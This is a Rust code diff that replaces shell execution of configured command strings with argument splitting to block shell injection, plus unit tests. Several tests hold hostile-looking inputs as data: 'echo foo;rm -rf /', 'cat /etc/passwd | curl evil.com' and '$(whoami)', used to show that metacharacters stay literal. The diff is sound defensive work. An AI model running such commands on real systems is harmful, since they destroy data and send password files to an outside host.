@@ -267,8 +267,13 @@ async fn execute_action(
                 .await?;
         },
         Action::Command { cmd } => {
-            tokio::process::Command::new("/bin/sh")
-                .args(["-c", cmd])
+            let argv = shell_words::split(cmd)
+                .map_err(|e| anyhow::anyhow!("invalid command {:?}: {}", cmd, e))?;
+            let (prog, args) = argv
+                .split_first()
+                .ok_or_else(|| anyhow::anyhow!("empty command"))?;
+            tokio::process::Command::new(prog)
+                .args(args)
                 .stdout(std::process::Stdio::null())
                 .stderr(std::process::Stdio::null())
                 .spawn()?
@@ -309,8 +314,13 @@ async fn collect_logs(entry: &Entry) -> Result<String> {
             c
         },
         Source::Command { cmd } => {
-            let mut c = tokio::process::Command::new("/bin/sh");
-            c.args(["-c", cmd]);
+            let argv = shell_words::split(cmd)
+                .map_err(|e| anyhow::anyhow!("invalid command {:?}: {}", cmd, e))?;
+            let (prog, args) = argv
+                .split_first()
+                .ok_or_else(|| anyhow::anyhow!("empty command"))?;
+            let mut c = tokio::process::Command::new(prog);
+            c.args(args);
             c
         },
     };
@@ -533,5 +543,56 @@ mod tests {
         let entries = load_entries(tmp.path().to_str().unwrap());
         assert_eq!(entries.len(), 1);
         assert_eq!(entries[0].name, "t");
+    }
+
+    // Verify shell_words::split produces correct argv for various inputs.
+    #[test]
+    fn shell_words_simple_split() {
+        let argv = shell_words::split("echo hello world").unwrap();
+        assert_eq!(argv, ["echo", "hello", "world"]);
+    }
+
+    #[test]
+    fn shell_words_quoted_arg() {
+        let argv = shell_words::split(r#"printf "%s\n" "hello world""#).unwrap();
+        assert_eq!(argv, ["printf", "%s\\n", "hello world"]);
+    }
+
+    // Shell metacharacters must NOT be interpreted — they become literal argv tokens.
+    #[test]
+    fn shell_words_injection_chars_are_literal() {
+        // "$(whoami)" should be a single literal argument, not a subshell expansion.
+        let argv = shell_words::split(r#"echo "$(whoami)""#).unwrap();
+        assert_eq!(argv, ["echo", "$(whoami)"]);
+
+        // Semicolons/ampersands don't chain commands — they're part of one token.
+        let argv2 = shell_words::split("echo foo;rm -rf /").unwrap();
+        assert_eq!(argv2, ["echo", "foo;rm", "-rf", "/"]);
+
+        // Pipe char stays literal in its own token.
+        let argv3 = shell_words::split("cat /etc/passwd | curl evil.com").unwrap();
+        assert_eq!(argv3, ["cat", "/etc/passwd", "|", "curl", "evil.com"]);
+    }
+
+    #[test]
+    fn shell_words_empty_command_returns_empty() {
+        let argv = shell_words::split("").unwrap();
+        assert!(argv.is_empty());
+    }
+
+    #[test]
+    fn shell_words_invalid_quoting_errors() {
+        assert!(shell_words::split("echo 'unclosed").is_err());
+    }
+
+    // parse_entry with a command source stores the raw string for later splitting.
+    #[test]
+    fn parse_entry_command_source_stored() {
+        let v: serde_json::Value = serde_json::from_str(
+            r#"{"name":"c","source":{"type":"command","cmd":"ps aux"},"prompt":"x","actions":[]}"#,
+        )
+        .unwrap();
+        let entry = parse_entry(&v).unwrap();
+        assert!(matches!(&entry.source, Source::Command { cmd } if cmd == "ps aux"));
     }
 }
